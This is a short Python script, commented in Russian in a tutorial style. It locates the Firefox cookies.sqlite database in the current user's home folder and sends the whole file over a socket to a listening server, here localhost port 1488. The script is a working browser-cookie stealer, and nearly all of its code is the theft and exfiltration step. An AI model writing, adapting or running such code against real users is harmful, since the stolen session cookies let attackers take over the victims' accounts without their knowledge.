import glob
from os.path import expanduser
import socket

# Инициализация клиентского сокета, подключение к серверу
sock = socket.socket()
sock.connect(('localhost', 1488))


def send_moz_cookies():
    # Функция expanduser используется для получения абсолютного пути к домашней папке текущего юзера
    cookie_db_pattern = expanduser('~/.mozilla/firefox/*.default/cookies.sqlite')
    # Glob - по сути своей навороченный os.listdir, возвращает список путей соответсвующих паттерну заданному выше
    cookie_files = glob.glob(cookie_db_pattern)

    if cookie_files:
        sock.send(b'Upload')  # Даём серверу понять, что сейчас мы отошлём файл
        with open(cookie_files[0], 'rb') as f:
            file_bytes = f.read()
        sock.send(file_bytes)  # Шлём содержимое файла в бинарном виде
        sock.close()  # Закрываем соединение


send_moz_cookies()
